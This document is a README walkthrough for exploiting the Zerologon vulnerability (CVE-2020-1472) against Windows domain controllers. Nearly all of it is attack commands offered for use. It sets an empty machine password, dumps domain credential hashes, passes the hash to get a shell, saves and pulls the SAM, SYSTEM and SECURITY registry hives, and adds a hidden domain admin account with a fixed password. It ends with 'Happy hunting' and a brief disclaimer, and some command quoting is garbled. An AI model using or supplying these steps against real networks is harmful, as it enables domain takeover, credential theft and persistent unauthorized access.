# zerologon
zerologon script to exploit CVE-2020-1472 CVSS 10/10
Exploit code based on https://www.secura.com/blog/zero-logon and https://github.com/SecuraBV/CVE-2020-1472. Original research and scanner by Secura, modifications by RiskSense Inc. https://github.com/risksense/zerologon

To exploit, clear out any previous Impacket installs you have and install Impacket from https://github.com/SecureAuthCorp/impacket/commit/b867b21 or newer.

`apt update  `

`apt remove --purge impacket-scripts python3-impacket   `
`apt autoremove  `

`git clone https://github.com/rthalley/dnspython.git   `
`sudo python3 setup.py install  `
`cd ..  `
`git clone https://github.com/SecureAuthCorp/impacket.git  `
`cd impacket  `
`sudo python3 setup.py install  `
`git clone  `

Then, do:

`python3 set_empty_pw DC_NETBIOS_NAME DC_IP_ADDR`

If that's successful you will then be able to:

`sudo secretsdump.py -just-dc domain/hostname\$@ip`

pressing "Enter" on prompt for password will pass you through,
which should get you Domain Admin hash. After you have that, wmiexec.py to the target DC with a credential from the secretsdump 

`wmiexec.py domain/Administrator@ip -hashes hash`

and do

`reg save HKLM\SYSTEM system.save'  
'get system.save'  
'del /f system.save\`  


`reg save HKLM\SAM sam.save`  
`get sam.save`  
`del /f sam.save`  


`reg save HKLM\SECURITY security.save'  
'get security.save'  
'del /f security.save`    

And then you can create a new Admin account just in case, 

`net user myadmin Hello1234 /ADD /DOMAIN`

and add the new account to domain admins group to obtain full privilages,

`net group "Domain Admins" myadmin /ADD /DOMAIN`

and probably `exit` now from C:\>

Then you can run

`sudo secretsdump.py -sam sam.save -system system.save -security security.save LOCAL`

And that should show you the original NT hash of the machine account. You can then re-install that original machine account hash to the domain by

`python3 reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR ORIG_NT_HASH`

Reinstalling the original hash is necessary for the DC to continue operating normally.

And just to make sure if the restoration process worked,

`sudo secretsdump.py -just-dc domain/hostname\$@ip`

and prressing "Enter" at password prompt won't work anymore.

And we're done here.

Happy hunting.

DISCLAIMER: This is purely for educational purposes, I will not be held responsible for any actions or their consequences
HACKING INTO SOMEONE ELSE'S DEVICE IS ILLEGAL AND IS PUNISHABLE BY LAW.
